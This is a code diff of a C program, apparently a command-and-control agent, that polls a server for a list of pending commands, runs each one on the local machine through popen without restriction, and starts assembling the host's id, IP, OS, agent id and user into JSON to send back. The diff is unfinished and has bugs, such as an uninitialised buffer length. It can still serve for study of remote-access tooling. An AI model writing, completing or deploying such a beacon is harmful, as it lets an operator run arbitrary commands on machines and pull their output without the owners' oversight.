@@ -4,20 +4,33 @@
 #include <json-c/json.h>
 
 //apt install libjson-c-dev
+/*
+struct headers{
+
+};
+*/
+
+
+
 
 // global variables
 char *first_response;
 char *polling_response;
 char *access_token;
+
 char *document_id;
 char *document_ip;
 char *document_os;
 char *document_agent_id;
 char *document_rev;
+
 char *document_user;
+
 char *pending_commands_array[10]; //multidimensional array used incase there are multiple commands pending
 char **ptr_pending_comm_array = pending_commands_array;
+char **command_output[100];
 // json variables for tokens recieved from initial check in 
+
 struct json_object *parsed_json;
 struct json_object *token;
 struct json_object *refresh;
@@ -36,6 +49,32 @@ size_t n_com_comm;
 
 ///////
 // json variables for params recieved on each poll to database 
+
+/// function runs commands and return output in char array used in second callback function when doing get request and polling for commands
+char *run_command_return_ouput(char *cmd){
+	char *tmp;
+	int counter = 0;
+	tmp = malloc(1024 * sizeof(char));
+	size_t n; // size for buffer
+	char *dest = malloc(1025 * sizeof(char));
+	FILE *ff = popen(cmd,"r");
+	if (ff == NULL){
+		printf("fail\n");
+		exit(1);
+	}
+	while(fgets(tmp,1025,ff )!= NULL){
+		//printf("%d\n",counter+=1);
+		strncat(dest,tmp,n);
+
+	}
+    if (pclose(ff) < 0)
+    	perror("pclose(3) error");
+
+    //printf("%s\n",dest);
+    return dest;
+
+}
+
 
 
 // first callback function on first_Check_in post request
@@ -69,27 +108,93 @@ void poll_callback(void *ptr, size_t size, size_t nmemb, void *stream){
     	document_rev = json_object_get_string(rev);
     	document_os = json_object_get_string(os);
     	document_ip = json_object_get_string(ip);
+    	//document_user = json_object_get_string(user);
     	document_user = json_object_get_string(user);
     	n_pen_comm = json_object_array_length(pending_commands);
     	if (json_object_array_get_idx(pending_commands,0)){ // this works as the check to see if there is a pending commands or not
     		puts("Exists");
     		int i;
+    		int x = 0;
     		printf("%lu\n",n_pen_comm);
     		for (i = 0; i < n_pen_comm; i++){
     			ptr_pending_comm_array[i] = json_object_get_string(json_object_array_get_idx(pending_commands,i));
     			puts("Successfully added following command to an array");
-    			printf("%s\n",ptr_pending_comm_array[i]);
+    			//printf("%s\n",ptr_pending_comm_array[i]);
 
     		}
     		// at this point you have pending commands in an array
     		// next step is to run the commands locally then get output save that to an array
     		// recreate the json string and post it back to the server
+    		//
+    		while (ptr_pending_comm_array[x] != NULL){
+    			// runs commands and puts the output in an array
+    			puts(ptr_pending_comm_array[x]);
+    			command_output[x] = run_command_return_ouput(ptr_pending_comm_array[x]);
+    			puts(command_output[x]);
+    			x++;
+
+    		}
+    		// now you have the command output in an array
+    		// and the commands in another array
+    		// now we gotta recreate the json string and post it back to the server
+    		// then do a get request to get a new access token
+
+    		// to recreate the json string we need to access the global variable that have the values and just create the json string with the json-c library
+    		/*	char *document_id;
+				char *document_ip;
+				char *document_os;
+				char *document_agent_id;
+				char *document_rev;
+				char *document_user;
+				char *document_pending;
+				char *document_complete;
+			*/
+    		printf("seeing if it gets this far %s\n",document_user);
+    		json_object *post_object = json_object_new_object();
+    		json_object *j_id = json_object_new_string(document_id);
+    		json_object *j_ip = json_object_new_string(document_ip);
+    		json_object *j_os = json_object_new_string(document_os);
+    		json_object *j_agent = json_object_new_string(document_agent_id);
+    		json_object *j_rev = json_object_new_string(document_rev);
+    		
+    		
+    		//missing pending command array and completed command array
+    		json_object *j_user = json_object_new_string(document_user);
+    		
+    		json_object_object_add(post_object,"_id", j_id);
+    		json_object_object_add(post_object,"ip", j_ip);
+    		json_object_object_add(post_object,"os", j_os);
+    		json_object_object_add(post_object,"agent_id", j_agent);
+    		json_object_object_add(post_object,"_rev", j_rev);
+    		json_object_object_add(post_object,"user", j_user);
+    		
+    		printf ("The json object created: %s\n",json_object_to_json_string(post_object));
+
+
+
+
+    /*{
+  "_id": "91f836e1a5e1e8ab04a1f042dc0236e1",
+  "_rev": "1-25508e47ebb1ce584141291c1e3ef7ad",
+  "agent_id": "50806",
+  "os": "Windows",
+  "ip": "0.0.0.0",
+  "user": "guest",
+  "completed_commands": [],
+  "pending_commands": []
+}
+*/
+
+
+    		
+
 
     	}
 
-    	else
+    	else {
     		puts("no commands\n");
-    		puts("GET REQUEST TO REFRESH TOKEN\n")
+    		puts("GET REQUEST TO REFRESH TOKEN\n");
+    	}
     	//printf("%s\n",test );
     	//n_pen_comm = json_object_array_length(pending_commands);
     	// currently stuck at this point trying to validate if the array is empty or not
@@ -201,6 +306,8 @@ int polling(char *id,char *token){
 	}
 
 */
+
+
 
 
 int main(void){
